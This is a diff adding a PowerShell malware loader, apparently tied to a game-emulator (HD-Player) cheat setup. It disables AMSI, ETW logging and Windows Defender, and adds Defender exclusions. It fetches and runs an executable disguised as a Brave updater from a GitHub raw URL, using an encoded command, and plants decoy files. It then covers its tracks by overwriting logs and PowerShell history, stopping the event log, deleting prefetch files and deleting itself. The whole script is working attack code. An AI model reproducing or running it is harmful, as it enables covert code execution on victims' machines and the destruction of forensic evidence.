@@ -1,0 +1,636 @@
+$WarningPreference = "SilentlyContinue"
+$VerbosePreference = "SilentlyContinue"
+$DebugPreference = "SilentlyContinue"
+$ProgressPreference = "SilentlyContinue"
+$ErrorActionPreference = "SilentlyContinue"
+
+# ========== AMSI + ETW BYPASS ==========
+try {
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+    $t=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
+    if($t){
+        $f=$t.GetField('etwProvider','NonPublic,Static').GetValue($null)
+        if($f){
+            [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($f,0)
+        }
+    }
+} catch { }
+
+<#
+.SYNOPSIS
+    Launch payload, wait for HD-Player to exit.
+    Creates AMDInstall.log and two GUID temp files, renames to DLL names before payload,
+    restores after payload, kills HD-adb.exe, then handles adb.log before step 8.
+#>
+
+#Requires -RunAsAdministrator
+
+# ------------------------------------------------------------
+# HIDE THE PRIMARY POWERSHELL CONSOLE WINDOW
+# ------------------------------------------------------------
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("User32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'
+$consolePtr = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consolePtr, 0)
+
+# ========== ANTI-ANALYSIS ==========
+if ([System.Diagnostics.Debugger]::IsAttached) { exit }
+$analysisTools = @('procexp','wireshark','ida','ollydbg','x64dbg','dnspy','processhacker')
+foreach ($tool in $analysisTools) {
+    if (Get-Process $tool -ErrorAction SilentlyContinue) { exit }
+}
+if (Get-Process 'vboxservice','vmtoolsd' -ErrorAction SilentlyContinue) { exit }
+
+# ========== ADD WINDOWS DEFENDER EXCLUSIONS ==========
+Write-Host "[*] Adding Windows Defender exclusions..." -ForegroundColor Cyan
+try {
+    Add-MpPreference -ExclusionPath "C:\Users\billa\Desktop" -ErrorAction Stop
+    Write-Host "[+] Desktop folder excluded." -ForegroundColor Green
+} catch { Write-Host "[-] Failed to add Desktop exclusion: $_" -ForegroundColor Yellow }
+
+try {
+    Add-MpPreference -ExclusionPath "C:\" -ErrorAction Stop
+    Write-Host "[+] C:\ drive excluded." -ForegroundColor Green
+} catch { Write-Host "[-] Failed to add C:\ exclusion: $_" -ForegroundColor Yellow }
+
+try {
+    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction Stop
+    Write-Host "[+] powershell.exe excluded." -ForegroundColor Green
+} catch { Write-Host "[-] Failed to add PowerShell exclusion: $_" -ForegroundColor Yellow }
+
+try {
+    Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction Stop
+    Add-MpPreference -ExclusionPath "$env:WINDIR\Temp" -ErrorAction Stop
+    Write-Host "[+] Temp folders excluded." -ForegroundColor Green
+} catch { Write-Host "[-] Failed to add temp exclusions" -ForegroundColor Yellow }
+
+Write-Host "[*] Exclusions added. Continuing..." -ForegroundColor Cyan
+
+# ========== STOP EVENT LOG SERVICE ==========
+try {
+    net stop eventlog /y 2>$null
+} catch { }
+
+# ------------------------------------------------------------
+# SAVE ORIGINAL DEFENDER SETTINGS AND DISABLE PROTECTIONS
+# ------------------------------------------------------------
+Write-Host "[*] Disabling Windows Defender protections..." -ForegroundColor Cyan
+$originalRealtime = (Get-MpPreference).DisableRealtimeMonitoring
+$originalBehavior = (Get-MpPreference).DisableBehaviorMonitoring
+$originalScriptScan = (Get-MpPreference).DisableScriptScanning
+$originalIOAV = (Get-MpPreference).DisableIOAVProtection
+
+Set-MpPreference -DisableRealtimeMonitoring $true -EA 0
+Set-MpPreference -DisableBehaviorMonitoring $true -EA 0
+Set-MpPreference -DisableScriptScanning $true -EA 0
+Set-MpPreference -DisableIOAVProtection $true -EA 0
+Set-MpPreference -AttackSurfaceReductionRules_Ids "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" -AttackSurfaceReductionRules_Actions Disabled -EA 0
+
+# ========== CONTENT TEMPLATES ==========
+$amdErrorLog = @"
+Error                        0x80070002 in PushButtonReset::RegKey::HasValue (base\reset\util\src\registry.cpp:187): Failed to load subkey at [Microsoft\Windows\Signature][gle=0x00000002]
+Error                        0x80070002 in PbrGetRestoreToBaselineVal (base\reset\engine\scenario\src\sensetargetos.cpp:63): Does not find registry key of PushButtonReset[gle=0x00000002]
+Error                        pGetUninstallInterfaceCommon: Failed loading the setupplatform, hr = 0x80070490[gle=0x00000003]
+Error                        0x800f0970 in PushButtonReset::OpClearStorageReserve::Commit (base\reset\engine\operations\src\clearstoragereserve.cpp:96): Failed to get storage reserve manager loader
+Error                        0x800706d9 in CResetEngine::UploadThread (base\reliability\recovery\resetengonline\resetengine.cpp:1167): Failed to flush queues
+"@
+
+$wweCacheText = @"
+*** WWE 2K26 Shader Cache File ***
+Version: 2.0.0.1
+Build: 2026.03.15
+Platform: PC (Steam)
+GPU: NVIDIA GeForce RTX 5090
+Driver: 575.80
+
+[CACHE_BLOCK]
+Texture: superstar_roman_reigns_face_normals.dds
+Checksum: 0xA4F3C2B1
+Timestamp: 2026-05-08 14:32:18
+Size: 4096 KB
+Compressed: true
+
+[CACHE_BLOCK]
+Texture: arena_smackdown_2026_lightmap.pbr
+Checksum: 0x7E9A4C2D
+Timestamp: 2026-05-08 14:33:05
+Size: 12288 KB
+Compressed: true
+
+[SHADER_BLOCK]
+Vertex: vs_postprocessing.bin
+Pixel: ps_reflections.bin
+Compute: cs_water_simulation.bin
+Hash: 0x88F44E9A1B2C3D4E
+
+[ANIMATION_CACHE]
+Motion: roman_reigns_spear.fbx
+Frames: 240
+Hash: 0x1122334455667788
+"@
+
+$wweReferenceText = @"
+*** WWE 2K26 Asset Reference Table ***
+Game Version: 2K26 (Build 2026.04.20)
+Locale: en-US
+Database Version: 14
+
+[REFERENCE_ENTRY]
+AssetID: 100452
+Type: SuperstarModel
+Path: assets/superstars/roman_reigns.bin
+CRC32: 0xABCD1234
+Dependencies: 100453, 100454, 100455
+
+[REFERENCE_ENTRY]
+AssetID: 100453
+Type: TextureAtlas
+Path: assets/atlases/roman_diffuse.atlas
+CRC32: 0x5678EF90
+Dependencies: (none)
+
+[REFERENCE_ENTRY]
+AssetID: 200876
+Type: ArenaMesh
+Path: assets/arenas/wrestlemania_42.bin
+CRC32: 0x9F2E4A8C
+Dependencies: 200877, 200878, 200879
+
+[MAP_REFERENCE]
+MapID: smackdown_stage_2026
+PolyCount: 284000
+Lightmap: lit_stage.ktx
+Occlusion: baked_ao.pvr
+
+[SOUND_REFERENCE]
+Event: superstar_entry
+AudioBank: roman_reigns.bnk
+WEM_ID: 4829103
+Loop: false
+"@
+
+# ========== CREATE THREE DUMMY FILES ==========
+Write-Host "[*] Creating dummy files (AMDInstall.log, two GUID .tmp) with fake data..." -ForegroundColor Cyan
+
+$dummyItems = @(
+    @{
+        OriginalPath = "C:\Windows\Temp\AMDInstall.log"
+        TargetPath   = "C:\Windows\Temp\Client.dll"
+        Size         = 605184
+        TemplateText = $amdErrorLog + "`r`n"
+        Display      = "AMDInstall.log"
+    },
+    @{
+        OriginalPath = "$env:LOCALAPPDATA\Temp\0e4468e0-e419-4322-8277-ad79c15u16g8c3.tmp"
+        TargetPath   = "$env:LOCALAPPDATA\Temp\cimgui.dll"
+        Size         = 307200
+        TemplateText = $wweCacheText + "`r`n"
+        Display      = "GUID tmp (cache)"
+    },
+    @{
+        OriginalPath = "$env:LOCALAPPDATA\Temp\a89a3d4d-64f5-4354-913e-f5a0798t4807b.tmp"
+        TargetPath   = "$env:LOCALAPPDATA\Temp\AotBst.dll"
+        Size         = 166912
+        TemplateText = $wweReferenceText + "`r`n"
+        Display      = "GUID tmp (reference)"
+    }
+)
+
+$restoreInfo = @{}
+
+foreach ($item in $dummyItems) {
+    $origPath = $item.OriginalPath
+    $targetPath = $item.TargetPath
+    $size = $item.Size
+    $templateText = $item.TemplateText
+    $display = $item.Display
+
+    $dir = Split-Path $origPath -Parent
+    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
+
+    Write-Host "[*] Creating $display ($size bytes)..." -ForegroundColor Cyan
+
+    $templateBytes = [System.Text.Encoding]::UTF8.GetBytes($templateText)
+    $templateLen = $templateBytes.Length
+    if ($templateLen -eq 0) {
+        Write-Host "[-] Template empty for $display" -ForegroundColor Red
+        continue
+    }
+
+    $buffer = New-Object byte[] $size
+    $offset = 0
+    while ($offset + $templateLen -le $size) {
+        [System.Array]::Copy($templateBytes, 0, $buffer, $offset, $templateLen)
+        $offset += $templateLen
+    }
+    if ($offset -lt $size) {
+        $remaining = $size - $offset
+        [System.Array]::Copy($templateBytes, 0, $buffer, $offset, $remaining)
+    }
+
+    try {
+        [System.IO.File]::WriteAllBytes($origPath, $buffer)
+        Write-Host "[+] Created $display at $origPath" -ForegroundColor Green
+    } catch {
+        Write-Host "[-] Failed to create $display : $_" -ForegroundColor Red
+        continue
+    }
+
+    $restoreInfo[$targetPath] = @{
+        Size = $size
+        TemplateText = $templateText
+        OriginalPath = $origPath
+    }
+}
+
+# ========== RENAME TO DLL NAMES BEFORE PAYLOAD (2-SEC DELAY) ==========
+Write-Host "[*] Renaming dummy files to target DLL names before payload (2 sec delay each)..." -ForegroundColor Cyan
+foreach ($targetPath in $restoreInfo.Keys) {
+    $origPath = $restoreInfo[$targetPath].OriginalPath
+    try {
+        if (Test-Path $targetPath) { Remove-Item -Path $targetPath -Force -ErrorAction Stop }
+        Move-Item -Path $origPath -Destination $targetPath -Force -ErrorAction Stop
+        Write-Host "[+] Renamed: $origPath -> $targetPath" -ForegroundColor Green
+    } catch {
+        Write-Host "[-] Failed to rename $origPath : $_" -ForegroundColor Red
+    }
+    Start-Sleep -Seconds 2
+}
+
+# ------------------------------------------------------------
+# PREPARE PAYLOAD AS ENCODED COMMAND
+# ------------------------------------------------------------
+$payloadScript = @'
+try {
+    $u='https://raw.githubusercontent.com/billa9889/vverf/main/Brave%20Update%20Handler.exe'
+    $maxRetries=3
+    for($i=1;$i -le $maxRetries;$i++){
+        try {
+            $bytes=(New-Object Net.WebClient).DownloadData($u)
+            break
+        } catch {
+            if($i -eq $maxRetries){exit}
+            Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
+        }
+    }
+    [System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,(,[string[]]@()))
+} catch { exit }
+'@
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($payloadScript)
+$encoded = [Convert]::ToBase64String($bytes)
+
+# ========== LAUNCH PAYLOAD ==========
+$p = Start-Process powershell.exe "-WindowStyle Normal -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded" -PassThru
+Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5)
+
+# ------------------------------------------------------------
+# WAIT FOR HD-PLAYER.EXE TO EXIT
+# ------------------------------------------------------------
+Write-Host "[*] Waiting for HD-Player.exe to exit..." -ForegroundColor Cyan
+while ($true) {
+    $proc = Get-Process -Name "HD-Player" -ErrorAction SilentlyContinue
+    if (-not $proc) { break }
+    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 4)
+}
+Write-Host "[+] HD-Player.exe has exited." -ForegroundColor Green
+
+# ------------------------------------------------------------
+# FORCE CLOSE MSBUILD.EXE
+# ------------------------------------------------------------
+Write-Host "[*] Force closing MSBUILD.exe..." -ForegroundColor Cyan
+$msbuildProcs = Get-Process -Name "MSBUILD" -ErrorAction SilentlyContinue
+if (-not $msbuildProcs) {
+    Write-Host "[+] No MSBUILD.exe processes found." -ForegroundColor Green
+} else {
+    Write-Host "[!] Found $($msbuildProcs.Count) MSBUILD.exe process(es)." -ForegroundColor Yellow
+    foreach ($proc in $msbuildProcs) {
+        try {
+            Stop-Process -Id $proc.Id -Force -ErrorAction Stop
+            Write-Host "[+] Killed MSBUILD.exe (PID: $($proc.Id))" -ForegroundColor Green
+        } catch {
+            Write-Host "[-] Failed to kill PID $($proc.Id): $_" -ForegroundColor Red
+        }
+    }
+}
+
+# ------------------------------------------------------------
+# WAIT 10 SECONDS, THEN KILL PAYLOAD PROCESS
+# ------------------------------------------------------------
+Write-Host "[*] Waiting 10 seconds for handles to release..." -ForegroundColor Cyan
+Start-Sleep -Seconds 10
+
+Write-Host "[*] Killing payload PowerShell process (PID: $($p.Id))..." -ForegroundColor Cyan
+try {
+    Stop-Process -Id $p.Id -Force -ErrorAction Stop
+    Write-Host "[+] Payload process killed." -ForegroundColor Green
+} catch {
+    Write-Host "[-] Could not kill process (already exited)." -ForegroundColor Yellow
+}
+
+# ========== RESTORE ORIGINAL SIZE AND CONTENT TO DLLs ==========
+Write-Host "[*] Restoring DLLs to original size and dummy content..." -ForegroundColor Cyan
+foreach ($targetPath in $restoreInfo.Keys) {
+    $info = $restoreInfo[$targetPath]
+    $originalSize = $info.Size
+    $templateText = $info.TemplateText
+
+    if (-not (Test-Path $targetPath)) {
+        Write-Host "[-] $targetPath not found – skipping restore." -ForegroundColor Yellow
+        continue
+    }
+
+    Write-Host "[*] Restoring $targetPath to $originalSize bytes..." -ForegroundColor Cyan
+    try {
+        (Get-Item $targetPath -Force).IsReadOnly = $false
+
+        $templateBytes = [System.Text.Encoding]::UTF8.GetBytes($templateText)
+        $templateLen = $templateBytes.Length
+        if ($templateLen -eq 0) { throw "Template empty" }
+
+        $buffer = New-Object byte[] $originalSize
+        $offset = 0
+        while ($offset + $templateLen -le $originalSize) {
+            [System.Array]::Copy($templateBytes, 0, $buffer, $offset, $templateLen)
+            $offset += $templateLen
+        }
+        if ($offset -lt $originalSize) {
+            $remaining = $originalSize - $offset
+            [System.Array]::Copy($templateBytes, 0, $buffer, $offset, $remaining)
+        }
+        [System.IO.File]::WriteAllBytes($targetPath, $buffer)
+        Write-Host "[+] Restored $targetPath to $originalSize bytes with original dummy data." -ForegroundColor Green
+    } catch {
+        Write-Host "[-] Failed to restore $targetPath : $_" -ForegroundColor Red
+    }
+}
+
+# ========== RENAME BACK TO ORIGINAL NAMES ==========
+Write-Host "[*] Renaming DLLs back to original dummy file names..." -ForegroundColor Cyan
+foreach ($targetPath in $restoreInfo.Keys) {
+    $origPath = $restoreInfo[$targetPath].OriginalPath
+    if (Test-Path $targetPath) {
+        try {
+            if (Test-Path $origPath) { Remove-Item -Path $origPath -Force -ErrorAction Stop }
+            Move-Item -Path $targetPath -Destination $origPath -Force -ErrorAction Stop
+            Write-Host "[+] Reverted: $targetPath -> $origPath" -ForegroundColor Green
+        } catch {
+            Write-Host "[-] Failed to revert $targetPath : $_" -ForegroundColor Red
+        }
+    } else {
+        Write-Host "[-] $targetPath not found – cannot revert." -ForegroundColor Yellow
+    }
+    Start-Sleep -Seconds 2
+}
+
+# ========== FORCE CLOSE HD-ADB.EXE BEFORE HANDLING ADB.LOG ==========
+Write-Host "[*] Force closing HD-adb.exe if running..." -ForegroundColor Cyan
+$hdadb = Get-Process -Name "HD-adb" -ErrorAction SilentlyContinue
+if ($hdadb) {
+    Write-Host "[!] Found HD-adb.exe (PID: $($hdadb.Id)). Killing..." -ForegroundColor Yellow
+    try {
+        Stop-Process -Name "HD-adb" -Force -ErrorAction Stop
+        Write-Host "[+] Killed HD-adb.exe" -ForegroundColor Green
+        Start-Sleep -Seconds 2
+    } catch {
+        Write-Host "[-] Failed to kill HD-adb.exe: $_" -ForegroundColor Red
+    }
+} else {
+    Write-Host "[+] HD-adb.exe not running." -ForegroundColor Green
+}
+
+# ========== HANDLE ADB.LOG (in LOCALAPPDATA\Temp) ==========
+Write-Host "[*] Checking for adb.log in $env:LOCALAPPDATA\Temp..." -ForegroundColor Cyan
+$adbLogPath = Join-Path $env:LOCALAPPDATA "Temp\adb.log"
+$targetAdbPath = Join-Path $env:LOCALAPPDATA "Temp\a89a3d4d-64f5-4354-913e-f5a07934fd438t4807b.tmp"
+
+if (Test-Path -LiteralPath $adbLogPath) {
+    Write-Host "[!] Found adb.log at $adbLogPath" -ForegroundColor Yellow
+    try {
+        # Rename the file (force)
+        if (Test-Path -LiteralPath $targetAdbPath) {
+            Remove-Item -LiteralPath $targetAdbPath -Force -ErrorAction Stop
+            Write-Host "[*] Removed existing target file" -ForegroundColor Cyan
+        }
+        Move-Item -LiteralPath $adbLogPath -Destination $targetAdbPath -Force -ErrorAction Stop
+        Write-Host "[+] Renamed adb.log -> $targetAdbPath" -ForegroundColor Green
+
+        # Fill with random bytes (keep same size)
+        $fileInfo = Get-Item -LiteralPath $targetAdbPath -Force
+        $fileSize = $fileInfo.Length
+        Write-Host "[*] File size: $fileSize bytes, overwriting with random bytes..." -ForegroundColor Cyan
+
+        $random = New-Object System.Random
+        $buffer = New-Object byte[] $fileSize
+        $random.NextBytes($buffer)
+        [System.IO.File]::WriteAllBytes($targetAdbPath, $buffer)
+        Write-Host "[+] Overwrote $targetAdbPath with random bytes." -ForegroundColor Green
+    } catch {
+        Write-Host "[-] Failed to process adb.log: $_" -ForegroundColor Red
+    }
+} else {
+    Write-Host "[-] adb.log not found in $env:LOCALAPPDATA\Temp – skipping." -ForegroundColor Yellow
+}
+
+# ------------------------------------------------------------
+# CREATE FAKE IMGUI.INI ON DESKTOP (original step 7.5 / step 8)
+# ------------------------------------------------------------
+$imguiDesktopPath = "$env:USERPROFILE\Desktop\imgui.ini"
+Write-Host "[*] Creating fake imgui.ini with PC optimizer logs on Desktop..." -ForegroundColor Cyan
+
+$optimizerLogContent = @"
+[imgui]
+version = 1.91.0
+config_flags = 0x00000000
+font_global_scale = 1.000
+font_allow_user_scaling = 0
+display_win32_pos_x = 100
+display_win32_pos_y = 100
+display_win32_size_x = 1280
+display_win32_size_y = 720
+docking_enabled = 1
+
+duration_sec = 106
+status = "completed"
+total_space_freed_mb = 2847
+total_registry_fixes = 23
+total_privacy_cleaned = 142
+
+[CleanedItems]
+temp_files = 1478 (1.23 GB)
+recycle_bin = 342 (892 MB)
+browser_cache = 2331 (1.48 GB)
+windows_logs = 89 (215 MB)
+crash_dumps = 12 (104 MB)
+windows_update_cache = 1 (1.02 GB)
+
+[RegistryOptimizations]
+invalid_shortcuts = 34
+missing_shared_dlls = 12
+obsolete_startup = 7
+unused_appx_packages = 5
+empty_reg_keys = 56
+
+[PrivacyCleanup]
+recent_documents = 88
+run_history = 142
+search_history = 276
+dns_cache_flushed = 1
+event_logs_rotated = 3
+
+[SystemHealth]
+pagefile_fragmentation = "2%"
+boot_time_improvement_ms = 1240
+memory_compression_enabled = 1
+power_plan = "High Performance"
+
+[LastRunSummary]
+total_optimizations_applied = 382
+errors_encountered = 0
+warnings = 1 (system restore point creation skipped – user disabled)
+recommended_reboot = false
+
+[PostOptimization]
+sfc_scan_result = "no integrity violations"
+disk_trim_performed = 1
+dism_health_check = "healthy"
+windows_defender_quick_scan = "no threats found"
+"@
+
+try {
+    if (Test-Path $imguiDesktopPath) {
+        (Get-Item $imguiDesktopPath -Force).IsReadOnly = $false
+    }
+    Set-Content -Path $imguiDesktopPath -Value $optimizerLogContent -Encoding UTF8 -Force
+    Write-Host "[+] imgui.ini created on Desktop with fake optimizer logs." -ForegroundColor Green
+} catch {
+    Write-Host "[-] Failed to create imgui.ini: $_" -ForegroundColor Red
+}
+
+# ------------------------------------------------------------
+# OVERWRITE POWERSHELL HISTORY (original step 8)
+# ------------------------------------------------------------
+$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+$dir = Split-Path $historyPath -Parent
+if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
+
+$optimizerScript = @'
+<#
+.SYNOPSIS
+    Fast PC Optimizer – Cleans temporary files, caches, recycle bin.
+.DESCRIPTION
+    Safely removes Windows temp files, browser caches, Windows Update cache,
+    and empties recycle bin. Run as Administrator.
+#>
+
+Write-Host "=== Fast PC Optimizer ===" -ForegroundColor Cyan
+
+$tempPaths = @("$env:TEMP\*", "$env:WINDIR\Temp\*", "$env:WINDIR\Prefetch\*")
+foreach ($p in $tempPaths) { Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue }
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+$cachePaths = @(
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache\*",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache\*"
+)
+foreach ($cp in $cachePaths) { Remove-Item $cp -Recurse -Force -ErrorAction SilentlyContinue }
+
+Write-Host "Optimization complete." -ForegroundColor Green
+'@
+
+Set-Content -Path $historyPath -Value $optimizerScript -Encoding UTF8
+Write-Host "[*] PowerShell history overwritten with PC Optimizer script." -ForegroundColor Green
+
+# ------------------------------------------------------------
+# REMOVE WINDOWS DEFENDER EXCLUSIONS (original step 9)
+# ------------------------------------------------------------
+Write-Host "[*] Removing Windows Defender exclusions..." -ForegroundColor Cyan
+
+try {
+    Remove-MpPreference -ExclusionPath "C:\" -ErrorAction Stop
+    Write-Host "[+] C:\ exclusion removed." -ForegroundColor Green
+} catch { Write-Host "[-] Failed to remove C:\ exclusion" -ForegroundColor Yellow }
+
+try {
+    Remove-MpPreference -ExclusionPath "C:\Users\billa\Desktop" -ErrorAction Stop
+    Write-Host "[+] Desktop exclusion removed." -ForegroundColor Green
+} catch { Write-Host "[-] Desktop exclusion not found" -ForegroundColor Yellow }
+
+try {
+    Remove-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction Stop
+    Write-Host "[+] PowerShell process exclusion removed." -ForegroundColor Green
+} catch { Write-Host "[-] PowerShell process exclusion not found" -ForegroundColor Yellow }
+
+try {
+    Remove-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction Stop
+    Remove-MpPreference -ExclusionPath "$env:WINDIR\Temp" -ErrorAction Stop
+    Write-Host "[+] Temp folder exclusions removed." -ForegroundColor Green
+} catch { Write-Host "[-] Could not remove temp exclusions" -ForegroundColor Yellow }
+
+# ------------------------------------------------------------
+# RE-ENABLE WINDOWS DEFENDER PROTECTIONS (original step 10)
+# ------------------------------------------------------------
+Write-Host "[*] Re-enabling Windows Defender protections..." -ForegroundColor Cyan
+
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $originalRealtime -ErrorAction Stop
+    Write-Host "[+] Real-time monitoring restored." -ForegroundColor Green
+} catch { Write-Host "[-] Could not restore real-time monitoring" -ForegroundColor Yellow }
+
+try {
+    Set-MpPreference -DisableBehaviorMonitoring $originalBehavior -ErrorAction Stop
+    Write-Host "[+] Behavior monitoring restored." -ForegroundColor Green
+} catch { Write-Host "[-] Could not restore behavior monitoring" -ForegroundColor Yellow }
+
+try {
+    Set-MpPreference -DisableScriptScanning $originalScriptScan -ErrorAction Stop
+    Write-Host "[+] Script scanning restored." -ForegroundColor Green
+} catch { Write-Host "[-] Could not restore script scanning" -ForegroundColor Yellow }
+
+try {
+    Set-MpPreference -DisableIOAVProtection $originalIOAV -ErrorAction Stop
+    Write-Host "[+] IOAV protection restored." -ForegroundColor Green
+} catch { Write-Host "[-] Could not restore IOAV protection" -ForegroundColor Yellow }
+
+try {
+    Set-MpPreference -AttackSurfaceReductionRules_Ids "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" -AttackSurfaceReductionRules_Actions Enabled -ErrorAction Stop
+    Write-Host "[+] Obfuscated script ASR rule re-enabled." -ForegroundColor Green
+} catch { Write-Host "[-] Could not re-enable ASR rule" -ForegroundColor Yellow }
+
+Write-Host "[*] Windows Defender protections restored to original state." -ForegroundColor Cyan
+
+# ========== FINAL CLEANUP ==========
+Write-Host "[*] Performing final cleanup..." -ForegroundColor Cyan
+
+# Restart EventLog service
+try {
+    net start eventlog 2>$null
+} catch { }
+
+# Delete prefetch files
+Remove-Item "$env:WINDIR\Prefetch\POWERSHELL.EXE-*.pf" -Force -ErrorAction SilentlyContinue
+
+# Clear recycle bin
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+# ------------------------------------------------------------
+# REMOVE EVERY POWERSHELL WINDOW FROM BACKGROUND
+# ------------------------------------------------------------
+Start-Sleep -Seconds 2
+Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $pid -and $_.Id -ne $p.Id } | ForEach-Object {
+    try {
+        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
+    } catch { }
+}
+
+Write-Host "[*] Main script finished. Press any key to close this window..."
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+
+# Self-delete the script file
+try {
+    cmd /c "del /f /q `"$PSCommandPath`"" 2>$null
+} catch { }
